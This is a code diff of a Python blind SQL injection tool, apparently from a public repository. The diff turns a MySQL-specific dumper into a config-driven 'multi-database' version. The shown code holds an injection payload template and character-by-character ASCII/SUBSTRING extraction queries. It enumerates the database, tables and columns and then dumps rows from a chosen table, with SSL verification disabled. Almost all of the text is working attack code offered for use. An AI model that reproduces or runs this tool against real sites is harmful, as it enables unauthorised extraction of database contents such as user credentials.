@@ -8,10 +8,9 @@ import urllib3
 # Disable SSL verification warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Character set used for brute-forcing extracted data
 CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_-@."
 
-class CustomBlindSQLiDumper:
+class MultiDBBlindSQLiDumper:
     def __init__(self, config_path):
         self.load_config(config_path)
 
@@ -29,6 +28,7 @@ class CustomBlindSQLiDumper:
             self.threshold = self.config.get("time_threshold", 3.0)
             self.keyword = self.config.get("success_keyword", "")
             self.payload_template = self.config.get("payload_template", "1' AND ({query})-- -")
+            self.queries = self.config.get("queries", {})
             
             print(f"[+] Configuration loaded successfully from '{path}'")
         except Exception as e:
@@ -68,7 +68,7 @@ class CustomBlindSQLiDumper:
         return False
 
     def extract_string(self, query):
-        """Extract data character-by-character using SUBSTRING and ASCII matching."""
+        """Extract data character-by-character using SUBSTRING/SUBSTR and ASCII matching."""
         extracted = ""
         for pos in range(1, 50):
             found = False
@@ -86,22 +86,26 @@ class CustomBlindSQLiDumper:
 
     def run(self):
         print("\n" + "="*50)
-        print("   CUSTOMIZABLE BLIND SQLI DUMPER FOR GITHUB   ")
+        print("   MULTI-DATABASE BLIND SQLI DUMPER   ")
         print("="*50)
 
+        # 1. Extract Current Database
         print("[*] Extracting Current Database Name...")
-        db_query = "ascii(substring((SELECT database()), {pos}, 1)) = {ascii_val}"
+        db_query = self.queries.get("get_db")
         current_db = self.extract_string(db_query)
-        print(f"\n[+] Database: {current_db}")
+        print(f"\n[+] Active Database: {current_db}")
 
         if not current_db:
             print("[-] Couldn't extract database name. Check your config file and payloads.")
             return
 
+        # 2. Extract Tables
         print(f"\n[*] Extracting Tables from '{current_db}'...")
         tables = []
+        tbl_template = self.queries.get("get_tables")
+        
         for i in range(0, 15):
-            tbl_query = f"ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema='{current_db}' LIMIT {i},1), {{pos}}, 1)) = {{ascii_val}}"
+            tbl_query = tbl_template.format(db=current_db, offset=i, pos="{pos}", ascii_val="{ascii_val}")
             tbl = self.extract_string(tbl_query)
             if not tbl: break
             tables.append(tbl)
@@ -116,10 +120,13 @@ class CustomBlindSQLiDumper:
         choice = int(input("\nSelect Table Index to Dump: "))
         selected_table = tables[choice]
 
+        # 3. Extract Columns
         print(f"\n[*] Extracting Columns from '{selected_table}'...")
         columns = []
+        col_template = self.queries.get("get_columns")
+        
         for i in range(0, 15):
-            col_query = f"ascii(substring((SELECT column_name FROM information_schema.columns WHERE table_name='{selected_table}' LIMIT {i},1), {{pos}}, 1)) = {{ascii_val}}"
+            col_query = col_template.format(db=current_db, table=selected_table, offset=i, pos="{pos}", ascii_val="{ascii_val}")
             col = self.extract_string(col_query)
             if not col: break
             columns.append(col)
@@ -132,11 +139,14 @@ class CustomBlindSQLiDumper:
         cols_idx = input("\nEnter Column Indexes (e.g. 0,2): ")
         selected_cols = [columns[int(i.strip())] for i in cols_idx.split(",")]
 
+        # 4. Dump Data
         print(f"\n[*] Dumping Data from '{selected_table}'...")
+        dump_template = self.queries.get("dump_data")
+        
         for i in range(0, 20):
             row = []
             for c in selected_cols:
-                dump_query = f"ascii(substring((SELECT {c} FROM {selected_table} LIMIT {i},1), {{pos}}, 1)) = {{ascii_val}}"
+                dump_query = dump_template.format(table=selected_table, column=c, offset=i, pos="{pos}", ascii_val="{ascii_val}")
                 val = self.extract_string(dump_query)
                 row.append(val if val else "NULL")
                 print(" | ", end="")
@@ -144,9 +154,9 @@ class CustomBlindSQLiDumper:
             print(f"\n[Row {i}] -> {dict(zip(selected_cols, row))}")
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Fully Customizable Blind SQL Injection Tool")
-    parser.add_argument("-c", "--config", default="config.json", help="Path to config.json file")
+    parser = argparse.ArgumentParser(description="Multi-Database Blind SQL Injection Tool")
+    parser.add_argument("-c", "--config", default="config_mysql.json", help="Path to config file (e.g., config_mysql.json)")
     args = parser.parse_args()
 
-    dumper = CustomBlindSQLiDumper(args.config)
+    dumper = MultiDBBlindSQLiDumper(args.config)
     dumper.run()
